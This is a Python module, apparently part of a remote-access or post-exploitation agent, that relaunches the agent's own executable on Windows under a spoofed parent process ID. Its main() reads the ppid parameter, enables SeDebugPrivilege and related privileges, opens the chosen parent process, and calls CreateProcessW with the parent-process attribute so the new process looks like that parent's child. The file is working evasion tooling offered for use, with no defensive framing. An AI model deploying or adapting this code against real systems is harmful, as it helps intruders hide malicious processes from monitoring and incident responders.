SCRIPT_METADATA = {
    "name": "win/privilege/ppid_spoof_launch",
    "display_name": "PPID Spoof Launch",
    "description": "Launch the current executable with a spoofed parent process ID.",
    "platforms": ["win"],
    "category": "Privilege",
    "params": [
        {
            "name": "ppid",
            "type": "number",
            "required": True,
            "description": "Target parent process ID to spoof."
        }
    ]
}

import ctypes
from ctypes import wintypes
import os
import subprocess

import win32api
import win32con
import win32security

from client.runtime.client_util import get_exec_and_args


PROCESS_CREATE_PROCESS = 0x0080
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
CREATE_UNICODE_ENVIRONMENT = 0x00000400
CREATE_NEW_CONSOLE = 0x00000010


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class STARTUPINFOEXW(ctypes.Structure):
    _fields_ = [
        ("StartupInfo", STARTUPINFOW),
        ("lpAttributeList", wintypes.LPVOID),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.InitializeProcThreadAttributeList.argtypes = [
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)
]
kernel32.InitializeProcThreadAttributeList.restype = wintypes.BOOL

kernel32.UpdateProcThreadAttribute.argtypes = [
    wintypes.LPVOID, wintypes.DWORD, ctypes.c_size_t,
    wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID,
]
kernel32.UpdateProcThreadAttribute.restype = wintypes.BOOL

kernel32.DeleteProcThreadAttributeList.argtypes = [wintypes.LPVOID]
kernel32.DeleteProcThreadAttributeList.restype = None

kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
    wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
    ctypes.POINTER(STARTUPINFOEXW), ctypes.POINTER(PROCESS_INFORMATION),
]
kernel32.CreateProcessW.restype = wintypes.BOOL

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL


def enable_privilege(privilege_name):
    token = win32security.OpenProcessToken(
        win32api.GetCurrentProcess(),
        win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
    )
    luid = win32security.LookupPrivilegeValue(None, privilege_name)
    result = win32security.AdjustTokenPrivileges(
        token,
        False,
        [(luid, win32con.SE_PRIVILEGE_ENABLED)],
    )
    # AdjustTokenPrivileges 成功返回但未必所有特权都分配成功
    if win32api.GetLastError() == 1300:  # ERROR_NOT_ALL_ASSIGNED
        print(f"[!] privilege not assigned: {privilege_name}")
    return result


def open_parent_process(ppid):
    handle = kernel32.OpenProcess(PROCESS_CREATE_PROCESS, False, ppid)
    if not handle:
        raise ctypes.WinError(ctypes.get_last_error())
    return handle


def build_attribute_list(parent_handle):
    size = ctypes.c_size_t(0)
    kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
    # 第一次调用预期失败，只为了拿 size，不清除 last_error
    if size.value == 0:
        raise ctypes.WinError(ctypes.get_last_error())

    buffer = (ctypes.c_byte * size.value)()
    attr_list = ctypes.cast(buffer, wintypes.LPVOID)

    if not kernel32.InitializeProcThreadAttributeList(
        attr_list, 1, 0, ctypes.byref(size)
    ):
        raise ctypes.WinError(ctypes.get_last_error())

    # parent_handle_var 必须活到 CreateProcessW 返回
    parent_handle_var = wintypes.HANDLE(parent_handle)
    if not kernel32.UpdateProcThreadAttribute(
        attr_list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ctypes.byref(parent_handle_var),
        ctypes.sizeof(parent_handle_var),
        None,
        None,
    ):
        raise ctypes.WinError(ctypes.get_last_error())

    # 返回 buffer 和 parent_handle_var 保持引用，防止 GC
    return buffer, attr_list, parent_handle_var


def current_exec():
    return get_exec_and_args()


def launch_with_ppid(exe, args, ppid, cwd=None):
    exe = os.path.abspath(exe)
    if not os.path.exists(exe):
        raise FileNotFoundError(exe)

    if cwd is None:
        cwd = os.path.dirname(exe)

    enable_privilege("SeDebugPrivilege")
    enable_privilege("SeAssignPrimaryTokenPrivilege")
    enable_privilege("SeIncreaseQuotaPrivilege")

    parent_handle = open_parent_process(ppid)

    # 确认父进程句柄仍然有效（可选，但能提前暴露问题）
    exit_code = wintypes.DWORD()
    if kernel32.GetExitCodeProcess(parent_handle, ctypes.byref(exit_code)):
        if exit_code.value != 259:  # STILL_ACTIVE
            raise RuntimeError(f"parent process {ppid} is not active")

    buffer, attr_list, parent_handle_var = build_attribute_list(parent_handle)

    try:
        siex = STARTUPINFOEXW()
        siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
        # 先设为 None 排除 Session 0 桌面访问导致的 ERROR_INVALID_HANDLE
        # 如果 agent 在交互式会话且需要出现在用户桌面，再改回 r"winsta0\default"
        siex.StartupInfo.lpDesktop = None
        siex.lpAttributeList = attr_list

        if args is None:
            args = []
        elif isinstance(args, str):
            args = [args]
        else:
            args = list(args)

        cmdline = subprocess.list2cmdline([exe] + args)
        cmdline_buf = ctypes.create_unicode_buffer(cmdline)

        pi = PROCESS_INFORMATION()
        flags = (
            EXTENDED_STARTUPINFO_PRESENT
            | CREATE_UNICODE_ENVIRONMENT
            | CREATE_NEW_CONSOLE
        )

        print(f"[+] spoofed parent PID: {ppid}")
        print(f"[+] launching: {cmdline}")
        print(f"[+] cwd: {cwd}")

        ok = kernel32.CreateProcessW(
            exe,
            cmdline_buf,
            None,
            None,
            False,
            flags,
            None,
            cwd,
            ctypes.byref(siex),
            ctypes.byref(pi),
        )
        if not ok:
            raise ctypes.WinError(ctypes.get_last_error())

        print(f"[+] started PID: {pi.dwProcessId}")

        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)

        return pi.dwProcessId
    finally:
        kernel32.DeleteProcThreadAttributeList(attr_list)
        kernel32.CloseHandle(parent_handle)


def main():
    try:
        ppid = int(kwargs.get("ppid"))
        if ppid <= 0:
            raise ValueError("ppid must be a positive integer.")

        exe_path, argv = current_exec()
        pid = launch_with_ppid(exe_path, argv, ppid)
        print(f"PID: {pid}")

    except (OSError, ValueError, TypeError, RuntimeError) as exc:
        print(f"[!] error: {exc}")


if __name__ == "__main__":
    main()